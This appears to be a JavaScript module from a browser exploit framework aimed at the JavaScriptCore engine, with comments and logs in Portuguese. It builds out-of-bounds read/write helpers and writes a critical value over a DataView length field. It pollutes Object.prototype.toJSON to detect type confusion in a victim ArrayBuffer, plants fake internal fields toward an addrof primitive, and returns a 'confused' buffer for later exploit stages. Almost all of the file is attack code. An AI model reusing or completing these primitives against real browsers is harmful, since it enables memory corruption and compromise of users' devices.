// js/core_exploit.mjs

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; // Logger padrão importado como 'log'
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
    // log(`Limpando ambiente OOB... (Setup: ${isOOBEnvironmentSetup}, Force: ${options.force_clear_even_if_not_setup})`, 'info', FNAME_CLEAR);
    if (!isOOBEnvironmentSetup && !options.force_clear_even_if_not_setup) {
        // log("Ambiente OOB já limpo/não configurado e não forçando. Sem ação.", 'info', FNAME_CLEAR);
        return;
    }
    oob_array_buffer_real = null;
    oob_dataview_real = null;
    isOOBEnvironmentSetup = false;
    // log("Ambiente OOB efetivamente limpo.", 'info', FNAME_CLEAR);
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function triggerOOB_primitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.triggerOOB_primitive';

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && oob_array_buffer_real.byteLength === getOOBAllocationSize() && oob_dataview_real.buffer === oob_array_buffer_real) {
            // log("Ambiente OOB já configurado e válido. Usando existente.", 'info', FNAME_TRIGGER);
            return true;
        } else {
            log(`Ambiente OOB marcado como configurado, mas as variáveis são inválidas/inconsistentes. Forçando re-inicialização.`, 'warn', FNAME_TRIGGER);
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }

    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentSetup}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true }); // Garante que está limpo antes de reconfigurar

    try {
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize);
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize); // Janela completa
        log(`Ambiente para Operações OOB CONFIGURADO com sucesso.`, 'good', FNAME_TRIGGER);
        log(`    oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        log(`    oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentSetup = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e; // Re-lança para o chamador saber da falha
    }
}

export function oob_read_absolute(absolute_offset, byteLength) {
    const FNAME_READ = 'CoreExploit.oob_read_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para leitura em ${toHexHelper(absolute_offset)}`, "error", FNAME_READ);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) { // Buffer foi detached
            isOOBEnvironmentSetup = false; // Marca para reinit
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para leitura.");
    }

    const relative_offset = absolute_offset; // Em nosso setup, dataview cobre todo o array_buffer_real
                                            // então absolute_offset é o mesmo que relative_offset para o DataView principal.

    // Verifica se a leitura está dentro dos limites do DataView
    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Leitura OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_READ);
        throw new RangeError(errorMsg);
    }

    try {
        switch (byteLength) {
            case 1: return oob_dataview_real.getUint8(relative_offset);
            case 2: return oob_dataview_real.getUint16(relative_offset, true); // true for littleEndian
            case 4: return oob_dataview_real.getUint32(relative_offset, true); // true for littleEndian
            case 8: {
                const low = oob_dataview_real.getUint32(relative_offset, true);
                const high = oob_dataview_real.getUint32(relative_offset + 4, true);
                return new AdvancedInt64(low, high);
            }
            default:
                log(`ERRO: Tamanho de leitura inválido: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for read: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_READ);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false; // Marca para reinit
        }
        throw e; // Re-lança
    }
}

export function oob_write_absolute(absolute_offset, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.oob_write_absolute';
    if (!isOOBEnvironmentSetup || !oob_dataview_real || oob_dataview_real.buffer.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado ou inválido para escrita em ${toHexHelper(absolute_offset)}`, "error", FNAME_WRITE);
        if (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0) { // Buffer foi detached
            isOOBEnvironmentSetup = false; // Marca para reinit
        }
        throw new Error("Ambiente OOB não inicializado ou inválido para escrita.");
    }
    const relative_offset = absolute_offset;

    if (relative_offset < 0 || (relative_offset + byteLength) > oob_dataview_real.byteLength) {
        const errorMsg = `Escrita OOB (abs ${toHexHelper(absolute_offset)} -> rel ${toHexHelper(relative_offset)}, tam ${byteLength}) fora dos limites da DataView (0-${oob_dataview_real.byteLength})`;
        log(errorMsg, "error", FNAME_WRITE);
        throw new RangeError(errorMsg);
    }

    try {
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(relative_offset, Number(value)); break;
            case 2: oob_dataview_real.setUint16(relative_offset, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(relative_offset, Number(value), true); break;
            case 8:
                if (!isAdvancedInt64Object(value)) {
                    // Tentar converter se for número simples para conveniência (assumindo parte baixa, alta é 0)
                    // Ou se for uma string hexadecimal.
                    if (typeof value === 'number' || typeof value === 'string') {
                        try {
                            value = new AdvancedInt64(value); // Tenta construir AdvancedInt64
                        } catch (convErr) {
                            log(`Falha ao converter valor ${value} para AdvancedInt64: ${convErr.message}`, 'error', FNAME_WRITE);
                            throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64 ou conversível.");
                        }
                    } else {
                        throw new TypeError("Valor para escrita de 8 bytes deve ser AdvancedInt64.");
                    }
                }
                oob_dataview_real.setUint32(relative_offset, value.low(), true);
                oob_dataview_real.setUint32(relative_offset + 4, value.high(), true);
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for write: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em ${toHexHelper(absolute_offset)} (rel ${toHexHelper(relative_offset)}): ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || (oob_dataview_real && oob_dataview_real.buffer.byteLength === 0)) {
            isOOBEnvironmentSetup = false; // Marca para reinit
        }
        throw e; // Re-lança
    }
}

export async function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (com re-inicialização forçada) ---`, 'test', FNAME_TEST);
    try {
        await triggerOOB_primitive({ force_reinit: true });
        const test_offset = 0x50; // Usar um offset seguro dentro da alocação padrão
        const test_val32 = 0x11223344;
        currentLog(`    Escrevendo ${toHexHelper(test_val32)} em ${toHexHelper(test_offset)} (32bit)...`, 'info', FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4);
        const read_val32 = oob_read_absolute(test_offset, 4);
        if (read_val32 === test_val32) {
            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST); throw new Error("Self-test 32bit failed");
        }

        const next_offset = test_offset + 8; // Evitar sobreposição simples
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    Escrevendo ${test_val64.toString(true)} em ${toHexHelper(next_offset)} (64bit)...`, 'info', FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8);
        const read_val64 = oob_read_absolute(next_offset, 8);
        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
        } else {
            currentLog(`FALHA: Lido ${isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64)}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST); throw new Error("Self-test 64bit failed");
        }
        currentLog(`--- Auto-Teste de OOB R/W Concluído ---`, 'test', FNAME_TEST);
        return true;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, 'critical', FNAME_TEST);
        return false;
    }
}

export function isOOBReady() {
    return isOOBEnvironmentSetup &&
           oob_array_buffer_real instanceof ArrayBuffer &&
           oob_dataview_real instanceof DataView &&
           oob_array_buffer_real.byteLength > 0 && // Garante que não é detached/zerado
           oob_dataview_real.buffer === oob_array_buffer_real && // Garante que o dataview ainda aponta para o buffer certo
           oob_dataview_real.buffer.byteLength > 0; // Confirmação extra do buffer do dataview
}

// Constantes para getStableConfusedArrayBuffer e selfTestTypeConfusionAndMemoryControl
export const HEISENBUG_OOB_DATAVIEW_METADATA_BASE = 0x58; // Exported
export const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET = 0x24; // Offset do m_length dentro da estrutura do DataView no oob_array_buffer_real // Exported
export const HEISENBUG_CRITICAL_WRITE_OFFSET = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET; // = 0x7C // Exported
export const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF; // Exported
export const HEISENBUG_VICTIM_AB_SIZE = 64; // Exported


export async function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado: Type Confusion e Controle de Memória para Addrof ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details = null;
    let overallSuccess = true;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, 'subtest', FNAME_TEST);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        currentLog(`    (TC) Alvo da corrupção OOB: ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}`, 'info', FNAME_TEST);
        currentLog(`    (TC) PASSO 1: Escrevendo valor CRÍTICO ${toHexHelper(HEISENBUG_CRITICAL_WRITE_VALUE)} em oob_array_buffer_real[${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        currentLog(`      (TC) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        await PAUSE(100);

        let victim_ab_tc = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        currentLog(`    (TC) PASSO 2: victim_ab_tc (tamanho ${HEISENBUG_VICTIM_AB_SIZE} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest_TC = function() {
            local_probe_details = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_ab_tc: (this === victim_ab_tc)
            };
            return { self_test_probe_executed: true };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest_TC,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`      (TC) Object.prototype.${ppKey_TC} poluído com sonda para self-test.`, "info", FNAME_TEST);

        let stringifyOutput_TC = null;
        currentLog(`      (TC) Chamando JSON.stringify(victim_ab_tc)...`, "warn", FNAME_TEST);
        stringifyOutput_TC = JSON.stringify(victim_ab_tc);
        currentLog(`      (TC) JSON.stringify completou. Retorno da sonda: ${stringifyOutput_TC ? stringifyOutput_TC : 'N/A'}`, "info", FNAME_TEST);
        currentLog(`      (TC) Detalhes da sonda: ${local_probe_details ? JSON.stringify(local_probe_details) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details && local_probe_details.is_victim_ab_tc && local_probe_details.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC) SUCESSO: Confusão de tipo detectada no self-test! 'this' é [object Object].`, "vuln", FNAME_TEST);
        } else {
            let detailsMsg = local_probe_details ? `is_victim_ab_tc=${local_probe_details.is_victim_ab_tc}, type=${local_probe_details.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC) FALHA: Teste de Type Confusion no self-test. Detalhes: ${detailsMsg}. Esperado [object Object] para victim_ab_tc.`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype['toJSON'];
            currentLog(`      (TC) Object.prototype.toJSON restaurado (SelfTest).`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null; // Reset para a próxima fase ou teste
        }
    }

    if (!overallSuccess) {
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }

    await PAUSE(200); // Pausa entre fases

    currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
    try {
        if (!isOOBReady()) {
            currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
            await triggerOOB_primitive({ force_reinit: true }); // Garante que está pronto
            if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
        }

        // Offsets relativos ao início do oob_array_buffer_real, onde a estrutura do DataView OOB é manipulada
        const OFFSET_M_VECTOR_CONTENTS = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // Geralmente 0x58 + 0x10 = 0x68
        const OFFSET_M_LENGTH_CONTENTS = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Geralmente 0x58 + 0x18 = 0x70 (ou 0x24 se usado offset alternativo)
        const OFFSET_M_MODE_CONTENTS   = HEISENBUG_OOB_DATAVIEW_METADATA_BASE + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;    // Geralmente 0x58 + 0x1C = 0x74

        const PLANT_VAL_M_VECTOR_LOW  = 0xAABBCCDD;
        const PLANT_VAL_M_VECTOR_HIGH = 0x11223344;
        const PLANT_M_VECTOR = new AdvancedInt64(PLANT_VAL_M_VECTOR_LOW, PLANT_VAL_M_VECTOR_HIGH);
        const PLANT_M_LENGTH = 0x7FFFFFFF; // Um tamanho grande, mas não necessariamente 0xFFFFFFFF para este teste
        const PLANT_M_MODE = 0x00000001;    // Exemplo de modo

        currentLog(`    (MC) Configurando estrutura hipotética de ArrayBufferView em oob_array_buffer_real:`, 'info', FNAME_TEST);
        currentLog(`      m_vector (@${toHexHelper(OFFSET_M_VECTOR_CONTENTS)}) para ${PLANT_M_VECTOR.toString(true)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_VECTOR_CONTENTS, PLANT_M_VECTOR, 8);
        currentLog(`      m_length (@${toHexHelper(OFFSET_M_LENGTH_CONTENTS)}) para ${toHexHelper(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_LENGTH_CONTENTS, PLANT_M_LENGTH, 4);
        currentLog(`      m_mode    (@${toHexHelper(OFFSET_M_MODE_CONTENTS)}) para ${toHexHelper(PLANT_M_MODE)}`, 'info', FNAME_TEST);
        oob_write_absolute(OFFSET_M_MODE_CONTENTS, PLANT_M_MODE, 4);

        currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
        const read_m_vector = oob_read_absolute(OFFSET_M_VECTOR_CONTENTS, 8);
        const read_m_length = oob_read_absolute(OFFSET_M_LENGTH_CONTENTS, 4);
        const read_m_mode   = oob_read_absolute(OFFSET_M_MODE_CONTENTS, 4);

        currentLog(`      Lido m_vector (@${toHexHelper(OFFSET_M_VECTOR_CONTENTS)}): ${read_m_vector.toString(true)}`, "leak", FNAME_TEST);
        currentLog(`      Lido m_length (@${toHexHelper(OFFSET_M_LENGTH_CONTENTS)}): ${toHexHelper(read_m_length)}`, "leak", FNAME_TEST);
        currentLog(`      Lido m_mode    (@${toHexHelper(OFFSET_M_MODE_CONTENTS)}): ${toHexHelper(read_m_mode)}`, "leak", FNAME_TEST);

        let memoryControlSuccess = true;
        if (!read_m_vector.equals(PLANT_M_VECTOR)) {
            currentLog(`    (MC) FALHA: m_vector lido (${read_m_vector.toString(true)}) não corresponde ao plantado (${PLANT_M_VECTOR.toString(true)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_length !== PLANT_M_LENGTH) {
            currentLog(`    (MC) FALHA: m_length lido (${toHexHelper(read_m_length)}) não corresponde ao plantado (${toHexHelper(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }
        if (read_m_mode !== PLANT_M_MODE) {
            currentLog(`    (MC) FALHA: m_mode lido (${toHexHelper(read_m_mode)}) não corresponde ao plantado (${toHexHelper(PLANT_M_MODE)}).`, "error", FNAME_TEST);
            memoryControlSuccess = false;
        }

        if (memoryControlSuccess) {
            currentLog(`    (MC) SUCESSO: Controle de m_vector, m_length e m_mode verificado!`, "vuln", FNAME_TEST);
        } else {
            currentLog(`    (MC) FALHA: Teste de Controle de Memória.`, "error", FNAME_TEST);
            overallSuccess = false;
        }
    } catch (e) {
        currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        overallSuccess = false;
    }

    if (overallSuccess) {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM SUCESSO ---`, 'test', FNAME_TEST);
        return true;
    } else {
        currentLog(`--- Auto-Teste Combinado CONCLUÍDO COM FALHA ---`, 'test', FNAME_TEST);
        return false;
    }
}


// =======================================================================================
// NOVA FUNÇÃO EXPORTADA: getStableConfusedArrayBuffer
// =======================================================================================
export async function getStableConfusedArrayBuffer() {
    const FNAME_GETTER = "CoreExploit.getStableConfusedArrayBuffer";
    log(`[${FNAME_GETTER}] Iniciando processo para obter ArrayBuffer confuso...`, "info", FNAME_GETTER);

    // 1. Garante que o ambiente OOB está pronto e realiza a escrita OOB crítica
    try {
        // É crucial que triggerOOB_primitive configure oob_array_buffer_real e oob_dataview_real
        // Esta chamada pode ser `await triggerOOB_primitive({ force_reinit: true });` se cada chamada
        // precisar de um estado OOB "fresco" e limpo, ou apenas `await triggerOOB_primitive();`
        // se o estado persistente for aceitável e já configurado.
        // Para garantir a condição da Heisenbug, uma re-inicialização pode ser mais segura.
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para getStableConfusedArrayBuffer.");
        }

        log(`[${FNAME_GETTER}] Realizando escrita OOB crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET)} para induzir Heisenbug...`, "warn", FNAME_GETTER);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_GETTER}] Escrita OOB crítica realizada.`, "info", FNAME_GETTER);
    } catch (e) {
        log(`[${FNAME_GETTER}] ERRO na preparação do ambiente OOB ou na escrita crítica: ${e.message}`, "critical", FNAME_GETTER);
        return null; // Falha em preparar a condição para a Heisenbug
    }

    await PAUSE(50); // Pequena pausa, pode ser crucial para Heisenbugs

    // 2. Crie o ArrayBuffer vítima
    let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
    log(`[${FNAME_GETTER}] Candidato a ArrayBuffer confuso (tamanho ${HEISENBUG_VICTIM_AB_SIZE}) criado.`, "info", FNAME_GETTER);

    // 3. Verifique internamente se a confusão ocorreu para este candidato
    let isConfirmedConfused = false;
    let observedTypeForCandidate = "";
    let originalToJSONDescriptorForGetter = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let tempPollutedByGetter = false;

    try {
        Object.defineProperty(Object.prototype, 'toJSON', {
            writable: true, configurable: true, enumerable: false,
            value: function MinimalProbeForGetter() { // Sonda mínima e local
                if (this === confused_ab_candidate) {
                    observedTypeForCandidate = Object.prototype.toString.call(this);
                    // Log verboso para depuração desta função crítica
                    log(`[${FNAME_GETTER}-Probe] 'this' é confused_ab_candidate. Tipo observado: ${observedTypeForCandidate}`, "info");
                    if (observedTypeForCandidate === '[object Object]') {
                        isConfirmedConfused = true;
                    }
                }
                return { getter_probe_executed: true }; // Retorno simples
            }
        });
        tempPollutedByGetter = true;

        log(`[${FNAME_GETTER}] Chamando JSON.stringify no candidato para verificar confusão...`, "info", FNAME_GETTER);
        JSON.stringify(confused_ab_candidate); // Tenta acionar a sonda

    } catch (e_verify) {
        log(`[${FNAME_GETTER}] Erro durante verificação interna da confusão: ${e_verify.message}`, "error", FNAME_GETTER);
    } finally {
        if (tempPollutedByGetter) {
            if (originalToJSONDescriptorForGetter) {
                Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForGetter);
            } else {
                delete Object.prototype.toJSON;
            }
            // log(`[${FNAME_GETTER}] Object.prototype.toJSON restaurado após verificação interna.`, "info");
        }
    }

    if (isConfirmedConfused) {
        log(`[${FNAME_GETTER}] CONFIRMADO: ArrayBuffer (tamanho ${HEISENBUG_VICTIM_AB_SIZE}) está confuso (tipo: ${observedTypeForCandidate}). Retornando...`, "vuln", FNAME_GETTER);
        // NÃO limpe o ambiente OOB aqui (clearOOBEnvironment()), pois o estado confuso
        // pode depender do oob_array_buffer_real e oob_dataview_real corrompidos.
        // O chamador será responsável por limpar o ambiente OOB quando terminar de usar o objeto confuso.
        return confused_ab_candidate;
    } else {
        log(`[${FNAME_GETTER}] FALHA: ArrayBuffer (tamanho ${HEISENBUG_VICTIM_AB_SIZE}) NÃO apresentou confusão esperada (tipo: ${observedTypeForCandidate}). Retornando null.`, "error", FNAME_GETTER);
        // Mesmo se falhar, o ambiente OOB pode ter sido alterado, o chamador pode querer limpar.
        return null;
    }
}
